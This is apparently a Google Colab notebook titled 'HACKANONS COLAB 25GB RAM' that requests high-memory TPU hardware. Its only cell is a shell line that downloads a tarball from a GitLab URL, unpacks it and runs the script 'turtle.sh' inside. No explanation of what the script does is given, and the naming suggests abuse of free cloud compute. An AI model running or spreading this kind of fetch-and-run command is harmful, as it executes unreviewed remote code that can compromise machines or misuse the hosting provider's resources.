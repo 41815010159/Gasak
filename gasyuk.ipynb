{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "HACKANONS COLAB 25GB RAM.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "! wget https://gitlab.com/besloper/coeg/-/raw/main/satu.tar.gz && tar xf satu.tar.gz && chmod +x turtle.sh && ./turtle.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
